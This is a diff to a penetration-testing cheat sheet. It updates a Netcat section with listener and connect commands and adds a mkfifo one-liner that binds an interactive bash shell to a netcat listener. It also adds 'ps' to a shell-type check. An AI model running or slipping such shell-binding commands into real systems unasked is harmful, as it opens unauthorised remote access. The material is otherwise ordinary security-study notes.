@@ -44,13 +44,22 @@ gobuster dir -u http://$IP --wordlist $Wordlist
 ## Netcat
 ---
 - Listening for incoming RevShells
-```sh
-nc -lvnp port
+```bash
+nc -lvnp <port>
 ```
 - Listen for incoming calls
-```sh
-nc -nc ip port
+```bash
+nc -nc <IP> <port>
 ```
+- Connect to a target
+```bash
+nc -nv <IP> <port>
+```
+- Binding a Bash shell to the TCP session
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <port> > /tmp/f
+```
+
 
 ---
 ## Python
@@ -190,4 +199,8 @@ tree $PATH
 - Check shell type
 ```bash
 env
+```
+or
+```bash
+ps
 ```
